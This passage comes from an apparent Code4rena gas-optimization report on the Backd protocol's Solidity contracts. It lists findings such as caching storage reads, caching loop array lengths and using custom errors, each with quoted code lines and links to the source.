https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L97  ```solidity File: protocol/contracts/tokenomics/Minter.sol  /// @audit currentInflationAmountLp 91:               currentInflationAmountLp +  /// @audit currentInflationAmountLp 208:                  currentInflationAmountLp +  /// @audit currentInflationAmountKeeper 92:               currentInflationAmountKeeper +  /// @audit currentInflationAmountKeeper 209:                  currentInflationAmountKeeper +  /// @audit currentInflationAmountAmm 93:               currentInflationAmountAmm;  /// @audit currentInflationAmountAmm 210:                  currentInflationAmountAmm;  /// @audit totalAvailableToNow 220:          require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L91  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  /// @audit minter 501:          uint256 lpInflationRate = Minter(minter).getLpInflationRate();  /// @audit minter 511:          uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();  /// @audit minter 526:          uint256 ammInflationRate = Minter(minter).getAmmInflationRate();  /// @audit totalKeeperPoolWeight 517:              totalKeeperPoolWeight;  /// @audit totalKeeperPoolWeight 575:          totalKeeperPoolWeight = totalKeeperPoolWeight > 0 ? totalKeeperPoolWeight : 0;  /// @audit totalLpPoolWeight 502:          uint256 poolInflationRate = (currentUInts256[key] * lpInflationRate) / totalLpPoolWeight;  /// @audit totalLpPoolWeight 589:          totalLpPoolWeight = totalLpPoolWeight > 0 ? totalLpPoolWeight : 0;  /// @audit totalAmmTokenWeight 528:              totalAmmTokenWeight;  /// @audit totalAmmTokenWeight 602:          totalAmmTokenWeight = totalAmmTokenWeight > 0 ? totalAmmTokenWeight : 0; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L501  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  /// @audit ammStakedIntegral 159:          perUserStakedIntegral[user] = ammStakedIntegral;  /// @audit totalStaked 90:                   (block.timestamp - uint256(ammLastUpdated))).scaledDiv(totalStaked);  /// @audit totalStaked 148:              ammStakedIntegral += (currentRate * timeElapsed).scaledDiv(totalStaked); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L159  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  /// @audit unallocatedSupply 84:           require(unallocatedSupply > 0, "No reward tokens in contract"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit epoch 87:           keeperRecords[beneficiary].feesInPeriod[epoch] += amount;  /// @audit epoch 88:           perPeriodTotalFees[epoch] += amount;  /// @audit epoch 131:              endEpoch = epoch; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L87  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit _roles[role].members 148:          return _roles[role].members[account]; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L148  ### 5. Multiple accesses of a mapping/array should use a local variable cache The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol  /// @audit stashedWithdraws[i] 142:                  totalAvailableToWithdraw += stashedWithdraws[i].amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L142  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  /// @audit amounts[i] 96:               address recipient_ = amounts[i].recipient; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L96  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  /// @audit keeperRecords[beneficiary] 84:               keeperRecords[beneficiary].firstEpochSet = true;  /// @audit keeperRecords[beneficiary] 85:               keeperRecords[beneficiary].nextEpochToClaim = epoch;  /// @audit keeperRecords[beneficiary] 87:           keeperRecords[beneficiary].feesInPeriod[epoch] += amount;  /// @audit keeperRecords[beneficiary] 139:          keeperRecords[beneficiary].nextEpochToClaim = endEpoch; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L84  ```solidity File: protocol/contracts/access/RoleManager.sol  /// @audit _roles[role] 148:          return _roles[role].members[account]; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L148  ### 6. The result of external function calls should be cached rather than re-calling the function The instances below point to the second+ call of the function within a single function  *There are 2 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol   #1  /// @audit _controller.addressProvider() 62:           Authorization(_controller.addressProvider().getRoleManager()) ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L62  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #2  /// @audit i.uncheckedInc() 121:          for (uint256 i; i < length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L121  ### 7. `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables  *There are 14 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  343:              strategiesTotalStaked += staked;  345:              _poolTotalStaked += staked;  392:              strategiesTotalStaked -= unstaked;  394:              _poolTotalStaked -= unstaked; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L343  ```solidity File: protocol/contracts/BkdLocker.sol  152:          totalLocked -= totalAvailableToWithdraw;  230:          totalLocked += amount; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L152  ```solidity File: protocol/contracts/tokenomics/Minter.sol  154:          issuedNonInflationSupply += amount;  188:          totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));  218:          totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L154  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol  67:           _vestedBefore += vested; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L67  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  113:          totalStaked += staked;  135:          totalStaked -= unstaked;  148:              ammStakedIntegral += (currentRate * timeElapsed).scaledDiv(totalStaked); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L113  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  115               poolStakedIntegral += (currentRate * (block.timestamp - poolLastUpdate)).scaledDiv( 116                   poolTotalStaked 117:              ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L115-L117  ### 8. `internal` functions only called once can be inlined to save gas Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.  *There are 6 instances of this issue:* ```solidity File: protocol/contracts/AddressProvider.sol  433:      function _addKnownAddressKey(bytes32 key, AddressProviderMeta.Meta memory meta) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L433  ```solidity File: protocol/contracts/RewardHandler.sol  62:       function _approve(address token, address spender) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L62  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  146:      function _mintRewards(address beneficiary, uint256 amount) internal returns (bool) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L146  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  96        function _depositInPool(address underlying_, ILiquidityPool pool_) 97            internal 98:           returns (uint256 received)  125:      function _swapperRouter() internal view returns (ISwapperRouter) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L96-L98  ```solidity File: protocol/contracts/tokenomics/LpGauge.sol  106:      function _mintRewards(address beneficiary, uint256 amount) internal { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/LpGauge.sol#L106  ### 9. Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` `require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol   #1  63:           totalTime = endtime_ - starttime_; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L63  ### 10. `<array>.length` should not be looked up in every loop of a `for`-loop The overheads outlined below are _PER LOOP_, excluding the first loop * storage arrays incur a Gwarmaccess (**100 gas**) * memory arrays use `MLOAD` (**3 gas**) * calldata arrays use `CALLDATALOAD` (**3 gas**)  Caching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset  *There are 8 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  259:          for (uint256 i; i < actions.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L259  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  22:           for (uint256 i; i < newPools_.length; ++i) {  39:           for (uint256 i; i < oldPoolAddresses_.length; ) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ```solidity File: protocol/contracts/RewardHandler.sol  42:           for (uint256 i; i < pools.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L42  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  116:          for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L116  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  94:           for (uint256 i; i < amounts.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L94  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol  56:           for (uint256 i; i < tokens_.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L56  ```solidity File: protocol/contracts/access/RoleManager.sol  82:           for (uint256 i; i < roles.length; i = i.uncheckedInc()) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/access/RoleManager.sol#L82  ### 11. `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  22:           for (uint256 i; i < newPools_.length; ++i) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L22  ### 12. `require()`/`revert()` strings longer than 32 bytes cost extra gas  *There is 1 instance of this issue:* ```solidity File: protocol/contracts/tokenomics/Minter.sol   #1  150           require( 151               issuedNonInflationSupply + amount <= nonInflationDistribution, 152               "Maximum non-inflation amount exceeded." 153:          ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L150-L153  ### 13. Using `bool`s for storage incurs overhead ```solidity     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**), and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  58:       mapping(address => bool) public strategies; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L58  ```solidity File: protocol/contracts/tokenomics/Minter.sol  41:       bool public initialPeriodEnded; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L41  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  31:       bool public weightBasedKeeperDistributionDeactivated;  41:       mapping(address => bool) public gauges; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L31  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  31:       bool public killed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L31  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  42:       bool public initializedSupply; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L42  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  37:       bool public override killed; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L37  ### 14. Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement This change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/BkdLocker.sol  91:           require(amount > 0, Error.INVALID_AMOUNT);  92:           require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  137:          require(length > 0, "No entries"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L91  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  104:          require(amount > 0, Error.INVALID_AMOUNT);  125:          require(amount > 0, Error.INVALID_AMOUNT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L104  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  84:           require(unallocatedSupply > 0, "No reward tokens in contract"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L84  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol  140:          require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L140  ### 15. Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead > When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.  https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html Use a larger size then downcast where needed  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol   #1  295:      function decimals() external view override returns (uint8) { ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L295  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol   #2  32:       uint48 public ammLastUpdated; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L32  ```solidity File: protocol/contracts/tokenomics/KeeperGauge.sol   #3  34:       uint48 public lastUpdated; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L34  ### 16. Using `private` rather than `public` for constants, saves gas If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  *There are 11 instances of this issue:* ```solidity File: protocol/contracts/tokenomics/Minter.sol  25:       uint256 public immutable initialAnnualInflationRateLp;  26:       uint256 public immutable annualInflationDecayLp;  30:       uint256 public immutable initialPeriodKeeperInflation;  31:       uint256 public immutable initialAnnualInflationRateKeeper;  32:       uint256 public immutable annualInflationDecayKeeper;  36:       uint256 public immutable initialPeriodAmmInflation;  37:       uint256 public immutable initialAnnualInflationRateAmm;  38:       uint256 public immutable annualInflationDecayAmm;  44:       uint256 public immutable nonInflationDistribution; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L25  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  37:       uint256 public immutable startTime;  38:       uint256 public immutable endTime; ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L37  ### 17. Duplicated `require()`/`revert()` checks should be refactored to a modifier or function Saves deployment costs  *There are 7 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  223:          require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L223  ```solidity File: protocol/contracts/utils/Preparable.sol  98:           require(deadlines[key] != 0, Error.NOTHING_PENDING); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L98  ```solidity File: protocol/contracts/AddressProvider.sol  260:          require(!meta.frozen, Error.ADDRESS_FROZEN); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L260  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  270:              require(IStakerVault(stakerVault).getLpGauge() != address(0), Error.ADDRESS_NOT_FOUND);  365:          require(length == weights.length, "Invalid length of arguments"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L270  ```solidity File: protocol/contracts/tokenomics/AmmGauge.sol  125:          require(amount > 0, Error.INVALID_AMOUNT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/AmmGauge.sol#L125  ```solidity File: protocol/contracts/tokenomics/VestedEscrow.sol  76:           require(msg.sender == admin, Error.UNAUTHORIZED_ACCESS); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrow.sol#L76  ### 18. `require()` or `revert()` statements that check input arguments should be at the top of the function Checks that involve constants should come before checks that involve state variables  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/Controller.sol   #1  35:           require(_inflationManager != address(0), Error.INVALID_ARGUMENT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L35  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol   #2  60:           require(_minter != address(0), Error.INVALID_MINTER); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L60  ```solidity File: protocol/contracts/tokenomics/VestedEscrowRevocable.sol   #3  54:           require(_recipient != treasury, "Treasury cannot be revoked!"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/VestedEscrowRevocable.sol#L54  ### 19. Empty blocks should be removed or emit something  The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)  *There are 3 instances of this issue:* ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol   #1  31:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L31  ```solidity File: protocol/contracts/RewardHandler.sol   #2  30:       receive() external payable {} ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L30  ```solidity File: protocol/contracts/tokenomics/FeeBurner.sol   #3  35:       receive() external payable {} // Recieve function for withdrawing from Backd ETH Pool ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/FeeBurner.sol#L35  ### 20. Use custom errors rather than `revert()`/`require()` strings to save deployment gas Custom errors are available from solidity version 0.8.4. The instances below match or exceed that version  *There are 109 instances of this issue:* ```solidity File: protocol/contracts/StakerVault.sol  66:           require(address(inflationManager_) != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  76:           require(currentAddresses[_LP_GAUGE] == address(0), Error.ROLE_EXISTS);  99:           require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);  112:          require(msg.sender != account, Error.SELF_TRANSFER_NOT_ALLOWED);  113:          require(balances[msg.sender] >= amount, Error.INSUFFICIENT_BALANCE);  145:          require(src != dst, Error.SAME_ADDRESS_NOT_ALLOWED);  154:          require(startingAllowance >= amount, Error.INSUFFICIENT_ALLOWANCE);  157:          require(srcTokens >= amount, Error.INSUFFICIENT_BALANCE);  202:          require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS);  223:          require(addressProvider.isAction(msg.sender), Error.UNAUTHORIZED_ACCESS);  323:          require(IERC20(token).balanceOf(msg.sender) >= amount, Error.INSUFFICIENT_BALANCE);  339:          require(staked == amount, Error.INVALID_AMOUNT);  366           require( 367               src == msg.sender || allowance_ >= amount || address(pool) == msg.sender, 368               Error.UNAUTHORIZED_ACCESS 369:          );  370:          require(balances[src] >= amount, Error.INSUFFICIENT_BALANCE); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/StakerVault.sol#L66  ```solidity File: protocol/contracts/Controller.sol  34:           require(address(inflationManager) == address(0), Error.ADDRESS_ALREADY_SET);  35:           require(_inflationManager != address(0), Error.INVALID_ARGUMENT);  82:           require(addressProvider.getBKDLocker() != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L34  ```solidity File: protocol/contracts/utils/Preparable.sol  28:           require(deadlines[key] == 0, Error.DEADLINE_NOT_ZERO);  29:           require(delay >= _MIN_DELAY, Error.DELAY_TOO_SHORT);  86:           require(deadlines[key] != 0, Error.NOTHING_PENDING);  98:           require(deadlines[key] != 0, Error.NOTHING_PENDING);  110:          require(block.timestamp >= deadline, Error.DEADLINE_NOT_REACHED);  111:          require(deadline != 0, Error.DEADLINE_NOT_SET); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/utils/Preparable.sol#L28  ```solidity File: protocol/contracts/BkdLocker.sol  59:           require(currentUInts256[_START_BOOST] == 0, Error.CONTRACT_INITIALIZED);  91:           require(amount > 0, Error.INVALID_AMOUNT);  92:           require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS);  119           require( 120               totalStashed[msg.sender] + amount <= balances[msg.sender], 121               "Amount exceeds locked balance" 122:          );  137:          require(length > 0, "No entries");  208           require( 209               _rewardToken == rewardToken || _replacedRewardTokens.contains(_rewardToken), 210               Error.INVALID_ARGUMENT 211:          ); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/BkdLocker.sol#L59  ```solidity File: protocol/contracts/zaps/PoolMigrationZap.sol  56:           require(lpTokenAmount_ != 0, "No LP Tokens");  57:           require(oldPool_.getWithdrawalFee(msg.sender, lpTokenAmount_) == 0, "withdrawal fee not 0"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/zaps/PoolMigrationZap.sol#L56  ```solidity File: protocol/contracts/AddressProvider.sol  64:           require(!_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_WHITELISTED);  71:           require(_whiteListedFeeHandlers.contains(feeHandler), Error.ADDRESS_NOT_WHITELISTED);  98:           require(pool != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  102:          require(poolToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  176:          require(_addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);  185:          require(!checkExists || _addressKeyMetas.contains(key), Error.ADDRESS_DOES_NOT_EXIST);  199:          require(exists, Error.ADDRESS_DOES_NOT_EXIST);  241:          require(!meta.frozen, Error.ADDRESS_FROZEN);  242:          require(meta.freezable, Error.INVALID_ARGUMENT);  260:          require(!meta.frozen, Error.ADDRESS_FROZEN);  270:          require(!meta.frozen, Error.ADDRESS_FROZEN);  295:          require(token != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  296:          require(!_stakerVaults.contains(token), Error.STAKER_VAULT_EXISTS);  325:          require(exists, Error.ADDRESS_NOT_FOUND);  428:          require(!_addressKeyMetas.contains(key), Error.INVALID_ARGUMENT);  434:          require(_addressKeyMetas.set(key, meta.toUInt()), Error.INVALID_ARGUMENT); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/AddressProvider.sol#L64  ```solidity File: protocol/contracts/tokenomics/Minter.sol  72:           require(_annualInflationDecayLp < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE);  73:           require(_annualInflationDecayKeeper < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE);  74:           require(_annualInflationDecayAmm < ScaledMath.ONE, Error.INVALID_PARAMETER_VALUE);  100:          require(address(token) == address(0), "Token already set!");  105:          require(lastEvent == 0, "Inflation has already started.");  132:          require(msg.sender == address(controller.inflationManager()), Error.UNAUTHORIZED_ACCESS);  150           require( 151               issuedNonInflationSupply + amount <= nonInflationDistribution, 152               "Maximum non-inflation amount exceeded." 153:          );  220:          require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded"); ``` https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L72  ```solidity File: protocol/contracts/tokenomics/InflationManager.sol  48:           require(gauges[msg.sender], Error.UNAUTHORIZED_ACCESS);  59:           require(minter == address(0), Error.ADDRESS_ALREADY_SET);  60:           require(_minter != address(0), Error.INVALID_MINTER);  95:           require(!weightBasedKeeperDistributionDeactivated, "Weight-based dist. deactivated.");  139:          require(_keeperGauges.contains(pool), Error.INVALID_ARGUMENT);  171:          require(length == weights.length, Error.INVALID_ARGUMENT);  174:              require(_keeperGauges.contains(pools[i]), Error.INVALID_ARGUMENT);  229:        